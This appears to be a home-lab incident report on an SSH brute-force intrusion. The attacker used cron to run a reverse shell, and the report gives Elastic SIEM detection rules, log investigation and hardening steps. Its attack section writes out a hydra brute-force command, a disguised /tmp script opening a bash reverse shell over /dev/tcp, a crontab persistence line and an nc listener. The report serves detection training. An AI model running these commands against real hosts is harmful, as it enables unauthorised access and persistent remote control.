
---
###  Summary
On october 8, 16:00:06 an attacker successfully bruteforced the SSH service on host `172.31.0.16`, logged in, and updated crontab to execute a reverse shell to their ip on port 4444 every minute.
After this, they connected by the reverse shell, ran some recon commands and terminated the session, not logging again.
Upon detection, the machine was isolated, and investigation started. All attacker's artifacts were removed, and the machine now seems clean.
It is recommended however to reimage the computer, and apply hardening measures detailed at the end.


**Incident Report:**
- Tickets: #345266 (ssh) and #233428 (crontab)
- Host: ubuntu-target (172.31.0.16)
- Account: ubuntu
- Attacker's assets: 172.31.0.15 (bruteforcer)
- Detected on October 8 16:10
- Status: Resolved

**Timeline:**
- 16:00:06 -> attacker logs in after brute forcing
- 16:00:26 -> SSH bruteforce alert goes off.
- 16:01:21 -> cron edited alert goes off, meaning attacker created reverse shell file and updated crontab between 16:00:06 and ~16:01:21.
- 16:02:01 -> Cron job triggers, giving the attacker a reverse shell.
- 16:03:41 -> Attacker logs off. No more connections after that. (connection lasted 1 min 40 secs).
### MITRE ATT&CK Mapping
| Tactic                | Technique                                   | ID        | Evidence                                 |
| :-------------------- | :------------------------------------------ | :-------- | :--------------------------------------- |
| **Initial Access**    | Brute Force: Password Guessing              | T1110.001 | Hydra SSH bruteforce against ubuntu user |
| **Initial Access**    | Valid Accounts: Local Accounts              | T1078.003 | SSH session accepted from 172.31.0.15    |
| **Persistence**       | Scheduled Task/Job: Cron                    | T1053.003 | Entry written via `crontab` command      |
| **Execution**         | Command & Scripting Interpreter: Unix Shell | T1059.004 | `/bin/bash` executed by cron daemon      |
| **Command & Control** | Non-Application Layer Protocol              | T1095     | TCP reverse shell to 172.31.0.15:4444    |

---
### attack

1. Gain initial access through a brute-force attack.
2. Access the machine through ssh with the hacked credentials
3. Gain persistence using cron, initiating a reverse shell periodically.
4. Listen for that connection, execute some recon commands, and log off.

**initial access:**
Using hydra for the brute-forcing:
```bash
hydra -l ubuntu -P ./ssh_bruteforce_wordlist.txt 172.31.0.16 ssh -v -o ssh_results.txt
```
![Pasted image 20261008155959](images/Pasted%20image%2020261008155959.png)*Start time: 15:59:42* 
Then we log in normally with ssh with the credentials obtained as if we were a legitimate user.
**persistence:**
Create the file /tmp/ubuntu_updater.sh with this content:

```bash

cat << 'EOF' > /tmp/ubuntu_updater.sh
#!/bin/bash
# if shell -> exit
ss -tna | grep -q "172.31.0.15:4444" && exit 0

bash -i >& /dev/tcp/172.31.0.15/4444 0>&1
EOF
```
this checks if there is already a live shell, if not, initiates one to our hardcoded ip and port.
We resort to this script because nc -e is disabled on some linux versions (to prevent this type of connections).
`chmod +x /tmp/ubuntu_updater.sh` 

add this line as a cron job using 
```bash
(crontab -l 2>/dev/null; echo "* * * * * /tmp/ubuntu_updater.sh") | crontab -
```

this runs our script every 1 minute.

Now on the attacker machine just exit the ssh session, run `nc -lvnp 4444` to listen and wait for the connection.
![Pasted image 20261008160316](images/Pasted%20image%2020261008160316.png)

*basic, unupgraded terminal*

---
### alerts

**ssh bruteforce successful alert:**
This is a correlation alert, detecting if there is a successful login after 10+ failed ones coming from the same ip.
```bash
sequence by host.name, source.ip with maxspan = 5m [authentication where event.category == "authentication" and event.outcome == "failure" and system.auth.ssh.event in ("Failed", "Failed password")] with runs = 10 [authentication where event.category == "authentication" and event.outcome == "success" and system.auth.ssh.event in ("Accepted", "Accepted password")]
```


![Pasted image 20261008161725](images/Pasted%20image%2020261008161725.png)


osticket action:
```JSON
{
  "alert": true,
  "autorespond": false,
  "source": "API",
  "name": "Elastic SIEM",
  "email": "alerts@example.com",
  "subject": "[CRITICAL] SSH Brute Force Success on {{context.alerts.0.host.name}}",
  "message": """data:text/html,<h3>SSH Brute Force Followed by Successful Login</h3><p><b>Target Host:</b> {{context.alerts.0.host.name}}</p><p><b>Attacker IP:</b> {{context.alerts.0.source.ip}}</p><p><b>Compromised User:</b> {{context.alerts.0.user.name}}</p><p><b>Rule:</b> {{context.rule.name}}</p><p><a href="{{{context.results_link}}}">Investigate in Kibana</a></p>"""
}
```
![Pasted image 20261008161625](images/Pasted%20image%2020261008161625.png)



**cron edited alert**
```lucene
event.category: "file" and event.type: ("creation" or "change") and file.path: (/etc/cron* or /etc/crontab or /var/spool/cron/*)
```
This alerts on creation of cron job / modification of crontab (for example manually with crontab -e).

osTicket action:
```JSON
{
  "alert": true,
  "autorespond": false,
  "source": "API",
  "name": "Elastic SIEM",
  "email": "alerts@example.com",
  "subject": "[Elastic Alert] Cron Modification Detected on {{#context.alerts}}{{host.name}}{{/context.alerts}}",
  "message": "data:text/html,<h3>Persistence Alert: Cron Modification</h3><p><b>Rule:</b> {{context.rule.name}}</p><p><b>Severity:</b> {{context.rule.severity}}</p>{{#context.alerts}}<p><b>Host:</b> {{host.name}}</p><p><b>User:</b> {{user.name}}</p><p><b>Target Path:</b> {{file.path}}</p><p><b>Command Executed:</b> {{process.command_line}}</p>{{/context.alerts}}<p><a href=\"{{{context.results_link}}}\">View Alert in Kibana</a></p>"
}
```
adding the osquery action:
`SELECT * FROM crontab;`
this will help us to see what crontab looks like after the modification.

This rule will result on the alert:

![Pasted image 20261008161122](images/Pasted%20image%2020261008161122.png)

---
and on the osquery response we can see an entry that catches the eye

![Pasted image 20261008161252](images/Pasted%20image%2020261008161252.png)

we see it is an entry that runs /tmp/ubuntu_updater.sh every minute.

---
### investigation and triage

To analyze the crontab execution we will look at the file inside the machine(after disconnecting it from all networks):

![Pasted image 20261008161430](images/Pasted%20image%2020261008161430.png)

The first command lists connections with ss, greps to see if there is one to the attackers ip, and if so exits. Otherwise it initiates a reverse shell connection to `172.31.0.15:4444`. This ip matches the one that was bruteforcing our ssh, per the ssh bruteforce alert.

We want to see when the attacker first gained access and the logs it left.
We know because of the ssh alert that it was around 16:00, look for the specific log:

![Pasted image 20261008162506](images/Pasted%20image%2020261008162506.png)


We also want to know what commands the attacker ran after logging in.

![Pasted image 20261008163124](images/Pasted%20image%2020261008163124.png)


Apparently they only ran the commands to establish persistence, and after that some system/network recon. No signs of further exploitation.

To map all of the attacker's activity, we are going to see if there actually was even a connection from the reverse shell, or if all were run from the ssh login.

```lucene
event.category: "network" and destination.ip: "172.31.0.15" and destination.port: 4444 and event.type: ("start" or "connection" or "info" or "end")
```

![Pasted image 20261008193620](images/Pasted%20image%2020261008193620.png)

first one:
```JSON
"destination": {
	"address": "172.31.0.15",
	"ip": "172.31.0.15",
	"port": 4444
},
...
"event": {
	"action": [
		"connection_attempted"
	],
...
{
  "network": {
    "direction": "egress",
    "transport": "tcp",
    "type": "ipv4"
  },
  "process": {
    "entity_id": "tdONSjRmMgcwFg+Hqxz+KQ",
    "executable": "/usr/bin/bash",
    "name": "bash",
    "parent": {
      "entity_id": "mez3fpA1WtEBhQw7234wbw"
    },
    "pid": 54077
  }
}
```
this is a successful reverse shell to 172.31.0.15:4444

The second one is the end of the connection, probably when the attacker logged off. There are no connections after that, the attacker stopped listening.
This reverse shell ran from 16:02:01 to 16:03:41. 1 min 40 secs

---
### Remediation and Hardening

Looking at the commands ran the response could be to just delete the crontab entry, the `/tmp/ubuntu_updater.sh` file and change credentials. Since we dont know if the history has been tampered, or if we are missing something on this analysis, i would reimage the machine nonetheless.

**Hardening:**
- Remove ssh password login, use key instead.
- Deploy fail2ban, to protect against bruteforce attacks
- Limit which users can create cron jobs.
- Restrict outbound traffic to only allowed ports
- IP whitelist / login behind a VPN.

---
